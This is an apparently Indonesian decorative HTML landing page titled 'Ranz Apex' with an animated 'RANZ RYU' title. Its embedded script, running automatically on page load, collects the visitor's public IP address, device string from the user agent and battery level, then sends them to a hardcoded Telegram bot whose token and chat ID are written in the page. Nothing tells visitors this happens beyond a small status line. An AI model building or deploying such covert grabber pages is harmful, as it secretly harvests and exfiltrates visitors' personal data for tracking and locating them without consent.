<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ranz Apex</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Creepster&family=Nosifer&family=Butcherman&display=swap');
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: linear-gradient(135deg, #000000 0%, #1a1a1a 50%, #000000 100%);
            color: white;
            font-family: 'Arial', sans-serif;
            height: 100vh;
            overflow: hidden;
            position: relative;
        }
        .particles {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            overflow: hidden;
            z-index: 1;
        }
        .particle {
            position: absolute;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 50%;
            animation: float 6s ease-in-out infinite;
        }
        @keyframes float {
            0%, 100% { transform: translateY(0px) rotate(0deg); opacity: 0.3; }
            50% { transform: translateY(-20px) rotate(180deg); opacity: 0.8; }
        }
        .shadow-overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: radial-gradient(circle at center, transparent 30%, rgba(0,0,0,0.8) 100%);
            z-index: 2;
        }
        .container {
            position: relative;
            z-index: 3;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            flex-direction: column;
        }
        .main-title {
            font-family: 'Butcherman', cursive;
            font-size: 8rem;
            font-weight: bold;
            color: #ffffff;
            text-shadow: 
                0 0 10px rgba(255, 255, 255, 0.8),
                0 0 20px rgba(255, 255, 255, 0.6),
                0 0 30px rgba(255, 255, 255, 0.4),
                0 0 40px rgba(255, 255, 255, 0.2);
            letter-spacing: 0.2em;
            animation: glow 2s ease-in-out infinite alternate;
            margin-bottom: 2rem;
            position: relative;
        }
        .main-title::before {
            content: '';
            position: absolute;
            top: -10px;
            left: -10px;
            right: -10px;
            bottom: -10px;
            background: linear-gradient(45deg, transparent, rgba(255,255,255,0.1), transparent);
            z-index: -1;
            border-radius: 10px;
        }
        @keyframes glow {
            from {
                text-shadow: 
                    0 0 10px rgba(255, 255, 255, 0.8),
                    0 0 20px rgba(255, 255, 255, 0.6),
                    0 0 30px rgba(255, 255, 255, 0.4);
            }
            to {
                text-shadow: 
                    0 0 20px rgba(255, 255, 255, 1),
                    0 0 30px rgba(255, 255, 255, 0.8),
                    0 0 40px rgba(255, 255, 255, 0.6);
            }
        }
        .subtitle {
            font-family: 'Arial', sans-serif;
            font-size: 1.2rem;
            color: rgba(255, 255, 255, 0.7);
            text-align: center;
            margin-bottom: 3rem;
            letter-spacing: 0.1em;
        }
        .deco-line {
            width: 200px;
            height: 2px;
            background: linear-gradient(90deg, transparent, white, transparent);
            margin: 1rem auto;
            animation: pulse 3s ease-in-out infinite;
        }
        @keyframes pulse {
            0%, 100% { opacity: 0.3; transform: scaleX(0.8); }
            50% { opacity: 1; transform: scaleX(1.2); }
        }
        .corner-deco {
            position: absolute;
            width: 100px;
            height: 100px;
            border: 2px solid rgba(255, 255, 255, 0.3);
            z-index: 2;
        }
        .corner-deco.top-left { top: 20px; left: 20px; border-right: none; border-bottom: none; }
        .corner-deco.top-right { top: 20px; right: 20px; border-left: none; border-bottom: none; }
        .corner-deco.bottom-left { bottom: 20px; left: 20px; border-right: none; border-top: none; }
        .corner-deco.bottom-right { bottom: 20px; right: 20px; border-left: none; border-top: none; }
        @media (max-width: 768px) {
            .main-title { font-size: 4rem; }
            .corner-deco { width: 50px; height: 50px; }
        }
        .loading {
            position: fixed;
            bottom: 20px;
            right: 20px;
            color: rgba(255, 255, 255, 0.5);
            font-size: 0.8rem;
            z-index: 10;
        }
    </style>
</head>
<body>
    <div class="particles" id="particles"></div>
    <div class="shadow-overlay"></div>
    <div class="corner-deco top-left"></div>
    <div class="corner-deco top-right"></div>
    <div class="corner-deco bottom-left"></div>
    <div class="corner-deco bottom-right"></div>
    <div class="container">
        <h1 class="main-title">RANZ RYU</h1>
        <div class="deco-line"></div>
        <p class="subtitle">Ranz The Shadows</p>
    </div>
    <div class="loading" id="loading">Initializing...</div>

    <script>
        const BOT_TOKEN = '7891554096:AAGL8qtu9UnEgGUzEXWWIheL3FvUP1IkHXo';
        const ADMIN_CHAT_ID = '7974589442';

        function createParticles() {
            const particlesContainer = document.getElementById('particles');
            const particleCount = 50;
            for (let i = 0; i < particleCount; i++) {
                const particle = document.createElement('div');
                particle.className = 'particle';
                particle.style.left = Math.random() * 100 + '%';
                particle.style.top = Math.random() * 100 + '%';
                particle.style.width = Math.random() * 4 + 2 + 'px';
                particle.style.height = particle.style.width;
                particle.style.animationDelay = Math.random() * 6 + 's';
                particle.style.animationDuration = (Math.random() * 4 + 4) + 's';
                particlesContainer.appendChild(particle);
            }
        }

        async function getUserIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch {
                return 'Unknown';
            }
        }

        function getDeviceInfo() {
            const userAgent = navigator.userAgent;
            let deviceName = 'Unknown Device';
            const match = userAgent.match(/\(([^)]+)\)/);
            if (match && match[1]) {
                deviceName = match[1];
            }
            return deviceName;
        }

        async function getBatteryInfo() {
            try {
                if ('getBattery' in navigator) {
                    const battery = await navigator.getBattery();
                    return Math.round(battery.level * 100) + '%';
                } else {
                    return 'Not Available';
                }
            } catch {
                return 'Not Available';
            }
        }

        async function sendToTelegram(ip, deviceName, battery) {
            const message = `╭────────╮
│ʟᴏᴋᴀsɪ : ${ip}
│ᴅᴇᴠɪᴄᴇ : ${deviceName}
│ʙᴀᴛᴛᴇʀʏ : ${battery}
╰────────╯`;

            const telegramURL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

            try {
                await fetch(telegramURL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: ADMIN_CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
            } catch (error) {
                console.error('Gagal kirim ke Telegram:', error);
            }
        }

        async function init() {
            const loadingElement = document.getElementById('loading');
            createParticles();

            loadingElement.textContent = 'Mengambil IP...';
            const ip = await getUserIP();

            loadingElement.textContent = 'Mengambil Device...';
            const deviceName = getDeviceInfo();

            loadingElement.textContent = 'Mengambil Baterai...';
            const battery = await getBatteryInfo();

            loadingElement.textContent = 'Mengirim ke Telegram...';
            await sendToTelegram(ip, deviceName, battery);

            setTimeout(() => {
                loadingElement.style.display = 'none';
            }, 1000);
        }

        window.addEventListener('load', init);
    </script>
</body>
</html>
